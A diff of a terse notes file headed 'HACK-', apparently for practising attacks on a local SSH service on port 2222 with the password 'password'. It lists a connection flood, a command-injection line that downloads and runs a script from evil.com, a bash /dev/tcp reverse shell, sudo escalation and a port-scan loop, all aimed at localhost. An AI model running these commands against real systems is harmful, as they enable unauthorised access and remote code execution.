@@ -1,6 +1,6 @@
 "# HACK-" 
 open cmd : to login 
-ssh admin@localhost -p 2222
+   ssh admin@localhost -p 2222
 
 try worng passwords 
 correct password :password
@@ -32,26 +32,27 @@ then again : ssh admin@localhost -p 2222
 
 
 other attacks :
-Connection Flood:
 
-for /L %i in (1,1,10) do start ssh admin@localhost -p 2222
+1) Connection Flood:
 
-Malicious Command Injection:
+          for /L %i in (1,1,10) do start ssh admin@localhost -p 2222
 
-ssh admin@localhost -p 2222 "wget http://evil.com/script.sh -O /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh"
+2) Malicious Command Injection:
 
-Reverse Shell Attempt:
+           ssh admin@localhost -p 2222 "wget http://evil.com/script.sh -O /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh"
 
-ssh admin@localhost -p 2222 "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
+3) Reverse Shell Attempt:
 
-Sudo Privilege Escalation:
+         ssh admin@localhost -p 2222 "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
 
-ssh admin@localhost -p 2222
- Then in session: sudo su
+4) Sudo Privilege Escalation:
 
-Port Scanning:
+          ssh admin@localhost -p 2222
+           Then in session: sudo su
 
-for /L %i in (1,1,100) do (
-  timeout 1 ssh admin@localhost -p %i 2>nul && echo Port %i is open || echo Port %i is closed
-)
+5) Port Scanning:
+
+       for /L %i in (1,1,100) do (
+         timeout 1 ssh admin@localhost -p %i 2>nul && echo Port %i is open || echo Port %i is closed
+       )
 
